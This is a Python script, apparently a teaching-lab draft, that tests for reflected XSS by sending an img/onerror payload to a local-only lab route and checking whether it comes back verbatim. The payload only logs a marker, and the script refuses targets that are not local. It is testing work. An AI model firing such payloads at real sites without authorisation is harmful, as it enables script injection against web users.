#!/usr/bin/env python3
"""XSS-002 teaching-lab verification draft.

Sends one GET request with an inert marker payload and reads the response back.
The browser-execution step is separate and must be observed manually in a browser.
Local targets only; no cookie reading, no exfiltration.
"""
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "LLM_LAB_XSS"
PAYLOAD = '<img src=x onerror="console.log(`LLM_LAB_XSS`)">'


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, "redirect refused", headers, fp)


def build_url(base, path, param, value):
    url = base.rstrip("/") + "/" + path.lstrip("/")
    sep = "&" if urllib.parse.urlparse(url).query else "?"
    return url + sep + urllib.parse.urlencode({param: value})


def main():
    parser = argparse.ArgumentParser(description="Reflected XSS request/readback draft for XSS-002")
    parser.add_argument("--base", default="http://127.0.0.1", help="lab base URL (local only)")
    parser.add_argument("--path", required=True, help="module route from the deployment; route is not present in the audited fragment")
    parser.add_argument("--param", default="name", help="GET parameter name, taken from the audited fragment")
    parser.add_argument("--cookie-file", default=None, help="file holding a Cookie header value for the lab session")
    args = parser.parse_args()

    parsed = urllib.parse.urlparse(args.base)
    if parsed.scheme not in ("http", "https") or parsed.hostname not in ("127.0.0.1", "localhost", "::1"):
        sys.exit("refusing non-local target: %s" % args.base)

    target = build_url(args.base, args.path, args.param, PAYLOAD)
    print("request: GET %s" % target)

    request = urllib.request.Request(target, method="GET")
    if args.cookie_file:
        with open(args.cookie_file, "r", encoding="utf-8") as handle:
            request.add_header("Cookie", handle.read().strip())

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=10) as response:
            status = response.getcode()
            body = response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        print("http error: %s" % err.code)
        sys.exit(2)
    except urllib.error.URLError as err:
        print("connection error: %s" % err.reason)
        sys.exit(3)

    print("status: %s" % status)
    reflected = PAYLOAD in body
    print("payload reflected verbatim: %s" % reflected)
    print("marker literal present: %s" % (MARKER in body))
    if reflected:
        print("next step: open the printed URL in the browser and watch the devtools console for %s" % MARKER)
    else:
        print("no verbatim reflection: record the exact response region before drawing any conclusion")


if __name__ == "__main__":
    main()
